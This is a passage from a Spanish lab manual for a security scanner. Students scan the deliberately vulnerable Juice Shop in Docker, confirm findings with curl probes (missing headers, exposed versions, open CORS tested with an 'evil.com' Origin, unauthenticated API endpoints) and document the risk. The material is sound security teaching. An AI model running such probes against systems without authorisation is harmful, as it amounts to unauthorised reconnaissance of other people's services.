for v in sorted(vulns, key=lambda x: x.get('cvss_score',0), reverse=True)[:5]:
    print(f'  [{v[\"severidad\"].upper():8s}] CVSS {v[\"cvss_score\"]} — {v[\"titulo\"][:50]}')
"
```

---

### Ejercicio 9 — Ciclo completo: detectar, verificar, entender (40 min)

**Objetivo:** recorrer el ciclo completo de un pentest educativo: escanear → confirmar hallazgo → documentar el riesgo.  
**Formato:** trabajo individual o en pareja

#### Paso 1 — Escaneo inicial de referencia

```bash
# Escaneo completo con todos los formatos
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile lab --format all
```

Anota los conteos de severidad del resultado.

#### Paso 2 — Elegir una vulnerabilidad para investigar

Del reporte generado, elige una vulnerabilidad de severidad **media** o **alta** y completa esta ficha:

```
FICHA DE VULNERABILIDAD
═══════════════════════════════════════════════
Nombre:         [copia del reporte]
Categoría OWASP: [copia del reporte]
CWE:            [copia del reporte]
CVSS Score:     [copia del reporte]

¿Cómo la confirmé manualmente?
  [describe los pasos que hiciste en el navegador / con curl]

¿Qué impacto tendría en una aplicación real?
  [consecuencia para el usuario final o la empresa]

¿Cómo se remedía?
  [copia del informe educativo o escribe con tus palabras]
═══════════════════════════════════════════════
```

#### Paso 3 — Confirmar el hallazgo manualmente

Dependiendo del tipo de hallazgo, usa una de estas técnicas:

**Para headers HTTP faltantes:**
```bash
curl -I http://localhost:3000 | grep -i "x-frame\|csp\|hsts\|x-content"
# Si no aparece nada → confirmado
```

**Para información de versiones expuesta:**
```bash
curl -I http://localhost:3000 | grep -i "x-powered-by\|server:"
```

**Para CORS abierto:**
```bash
curl -I -H "Origin: https://evil.com" http://localhost:3000/api/Users/login \
  | grep -i "access-control"
# Si responde Access-Control-Allow-Origin: * → CORS demasiado permisivo
```

**Para endpoints sin autenticación:**
```bash
# Intenta acceder a la API de administración sin token
curl -s http://localhost:3000/api/Users/ | python3 -m json.tool | head -20
# Si devuelve datos → endpoint sin auth
```

#### Paso 4 — Segundo escaneo (comparación)

Después de documentar los hallazgos, ejecuta un segundo escaneo idéntico:

```bash
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target juice-shop:3000 --profile lab
```

Abre el dashboard en http://localhost:8080 — verás el widget de comparación entre los dos escaneos mostrando si el número de vulnerabilidades cambió.

> En este ejercicio las vulnerabilidades serán las mismas porque no modificamos Juice Shop. Pero en un proyecto real, aquí es donde verías el progreso después de aplicar correcciones.

---

### Ejercicio 10 — Escanear tu propia aplicación (opcional, avanzado)

**Objetivo:** aplicar Scan Agent a una aplicación propia que estés desarrollando.  
**Requisito:** tu aplicación debe estar corriendo en Docker en la misma red, o tener una IP accesible.

#### Opción A — Agregar tu app a la red del lab

Si tu aplicación corre en Docker, agrégala a la red del lab:

```bash
# Conectar un contenedor existente a la red del lab
docker network connect scan-agent-network nombre_de_tu_contenedor
```

Luego escanea por nombre de contenedor:

```bash
docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target nombre_de_tu_contenedor:PUERTO --profile web
```

#### Opción B — Escanear por IP local

```bash
# En Windows: ipconfig → buscar la IP de la interfaz "vEthernet (WSL)" o similar
# En Linux/Mac: ip addr o ifconfig

docker run --rm --network scan-agent-network \
  scan-agent:3.0.0 \
  --scan --target TU_IP:PUERTO --profile quick
```

#### Qué buscar en tu aplicación

| Área | Qué verificar |
|------|--------------|
| Headers HTTP | ¿Están configurados X-Frame-Options, CSP, HSTS? |
| Endpoints | ¿Hay rutas sin autenticación que deberían estar protegidas? |
| Versiones | ¿El servidor revela versión de framework o lenguaje? |
| CORS | ¿El Access-Control-Allow-Origin es restrictivo? |
| Errores | ¿Los errores muestran stack traces o rutas internas? |

---

### Resumen de ejercicios

| # | Ejercicio | OWASP | Tiempo | Dificultad |
|---|-----------|-------|--------|-----------|
| 1 | Primer escaneo | A05 | 10 min | ⬤○○ Básico |
| 2 | Informe educativo | múltiple | 15 min | ⬤○○ Básico |
| 3 | Headers HTTP + clickjacking | A05 | 20 min | ⬤⬤○ Intermedio |
| 4 | SQL Injection en DVWA | A03 | 25 min | ⬤⬤○ Intermedio |
| 5 | XSS en DVWA | A03 | 20 min | ⬤⬤○ Intermedio |
| 6 | OWASP API Top 10 en Juice Shop | API1/4/8 | 30 min | ⬤⬤⬤ Avanzado |
| 7 | Escaneo ZAP pasivo | múltiple | 15 min | ⬤⬤○ Intermedio |
| 8 | API REST de Scan Agent | — | 15 min | ⬤⬤○ Intermedio |
| 9 | Ciclo completo detectar-verificar | múltiple | 40 min | ⬤⬤⬤ Avanzado |
| 10 | Tu propia aplicación | múltiple | variable | ⬤⬤⬤ Avanzado |

---

*Este manual cubre el uso básico y avanzado del entorno. Para los ejercicios prácticos de vulnerabilidades específicas, consulta [`docs/guides/LAB_GUIDE.md`](guides/LAB_GUIDE.md).*

*Uso exclusivo en entornos de práctica controlados. No usar las técnicas aquí descritas en sistemas sin autorización expresa.*